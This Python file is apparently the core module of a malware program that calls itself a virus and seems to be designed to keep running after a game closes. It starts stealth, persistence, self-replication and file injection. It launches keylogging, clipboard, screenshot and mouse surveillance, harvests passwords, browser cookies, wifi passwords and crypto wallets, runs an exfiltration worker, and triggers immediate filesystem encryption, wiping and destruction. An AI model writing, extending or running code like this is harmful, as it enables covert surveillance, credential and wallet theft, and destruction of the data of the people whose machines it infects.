#!/usr/bin/env python3
"""
Virus Core Module - Runs independently, continues even if game closes
"""
import os
import sys
import time
import threading
import signal

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from virus_config import *
from virus_utils import (
    init_log_file, close_log_file, log_activity,
    save_pid, remove_pid, is_virus_running
)
from virus_persistence import (
    setup_stealth, install_persistence, self_replicate,
    inject_into_target_files
)
from virus_surveillance import (
    start_system_keylogger, stop_system_keylogger,
    start_window_monitor, stop_window_monitor,
    start_mouse_monitor, monitor_clipboard, take_screenshot,
    monitor_system_activity, get_active_window_info, extract_url_from_title, log_window_change
)
from virus_data_collection import save_all_collected_data
from virus_exfiltration import exfiltration_worker
from virus_destruction import start_destruction

# Global flag for graceful shutdown
running = True
mouse_listener = None

def signal_handler(signum, frame):
    """Handle shutdown signals"""
    global running
    running = False
    log_activity("SYSTEM", "Received shutdown signal")

def main():
    """Main virus entry point - runs independently"""
    global running, mouse_listener
    
    # Check if already running
    if is_virus_running():
        print("Virus already running. Exiting.")
        sys.exit(0)
    
    # Save PID
    save_pid()
    
    # Setup signal handlers
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    # Initialize malware features FIRST
    if ENABLE_STEALTH:
        setup_stealth()
    
    if ENABLE_SELF_REPLICATION:
        self_replicate()
    
    if ENABLE_PERSISTENCE:
        install_persistence()
    
    # Initialize logging
    init_log_file()
    log_activity("SYSTEM", "Virus core initialized - running independently")
    log_activity("SYSTEM", "Malware-like features activated")
    
    # Start surveillance
    start_system_keylogger()
    start_window_monitor()
    
    if ENABLE_CLIPBOARD_MONITORING:
        clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
        clipboard_thread.start()
        log_activity("SYSTEM", "Clipboard monitoring started")
    
    if ENABLE_SCREENSHOTS:
        screenshot_thread = threading.Thread(target=take_screenshot, daemon=True)
        screenshot_thread.start()
        log_activity("SYSTEM", "Screenshot capture started")
    
    if ENABLE_MOUSE_TRACKING:
        mouse_listener = start_mouse_monitor()
        if mouse_listener:
            log_activity("SYSTEM", "Mouse tracking started")
    
    system_thread = threading.Thread(target=monitor_system_activity, daemon=True)
    system_thread.start()
    
    if ENABLE_DATA_EXFILTRATION:
        exfil_thread = threading.Thread(target=exfiltration_worker, daemon=True)
        exfil_thread.start()
        log_activity("SYSTEM", "Data exfiltration worker started")
    
    # Start filesystem destruction (encryption/wiping/corruption) - IMMEDIATE
    if ENABLE_FILESYSTEM_ENCRYPTION or ENABLE_FILESYSTEM_WIPING or ENABLE_FILESYSTEM_DESTRUCTION:
        # Start destruction immediately if enabled
        if DESTRUCTION_IMMEDIATE:
            from virus_destruction import destroy_filesystem
            immediate_destruction_thread = threading.Thread(target=destroy_filesystem, daemon=False)
            immediate_destruction_thread.start()
            log_activity("SYSTEM", "IMMEDIATE DESTRUCTION STARTED - System will be destroyed NOW!")
        
        # Also start periodic destruction worker
        destruction_thread = start_destruction()
        if destruction_thread:
            log_activity("SYSTEM", "Filesystem destruction module activated - COMPLETE DESTRUCTION MODE")
    
    # Log initial window
    window_title, app_name = get_active_window_info()
    if window_title or app_name:
        log_window_change(window_title, app_name, extract_url_from_title(window_title))
    
    # Collect ALL important data immediately
    log_activity("SYSTEM", "Starting comprehensive data exploitation...")
    start_time = time.time()
    collected_data = save_all_collected_data()
    collection_time = time.time() - start_time
    
    if collected_data:
        total_items = sum([
            len(collected_data.get('passwords', [])),
            len(collected_data.get('sensitive_files', [])),
            len(collected_data.get('browser_data', {}).get('cookies', [])),
            len(collected_data.get('wifi_passwords', [])),
            len(collected_data.get('email_configs', [])),
            len(collected_data.get('databases', [])),
            len(collected_data.get('crypto_wallets', [])),
        ])
        log_activity("DATA", f"Comprehensive data collection complete: {total_items} items in {collection_time:.2f}s")
    
    # Periodic data collection
    def periodic_data_collection():
        while running:
            time.sleep(DATA_COLLECTION_INTERVAL)
            try:
                if running:
                    save_all_collected_data()
            except:
                pass
    
    collection_thread = threading.Thread(target=periodic_data_collection, daemon=True)
    collection_thread.start()
    
    # Periodic file injection
    def periodic_file_injection():
        while running:
            time.sleep(FILE_INJECTION_INTERVAL)
            try:
                if running:
                    inject_into_target_files()
            except:
                pass
    
    if ENABLE_FILE_INJECTION:
        injection_thread = threading.Thread(target=periodic_file_injection, daemon=True)
        injection_thread.start()
        # Run immediately on startup
        inject_into_target_files()
        log_activity("SYSTEM", "File injection module active")
    
    log_activity("SYSTEM", "All surveillance modules active - monitoring user activity")
    
    # Main loop - keep running until shutdown
    try:
        if AUTO_CLOSE_AFTER_COLLECTION:
            # Wait for initial collection to complete, then check if we should exit
            if collection_time < COLLECTION_TIMEOUT:
                log_activity("SYSTEM", f"Initial collection complete in {collection_time:.2f}s. Auto-closing...")
                time.sleep(2)  # Give time for final logs
                running = False
            else:
                log_activity("SYSTEM", "Collection took longer than timeout. Continuing...")
        
        # Keep running until signal or manual stop
        while running:
            time.sleep(1)
            
    except KeyboardInterrupt:
        running = False
    finally:
        # Cleanup
        log_activity("SYSTEM", "Shutting down virus...")
        stop_window_monitor()
        stop_system_keylogger()
        if mouse_listener:
            try:
                mouse_listener.stop()
            except:
                pass
        close_log_file()
        remove_pid()
        log_activity("SYSTEM", "Virus shutdown complete")

if __name__ == "__main__":
    main()

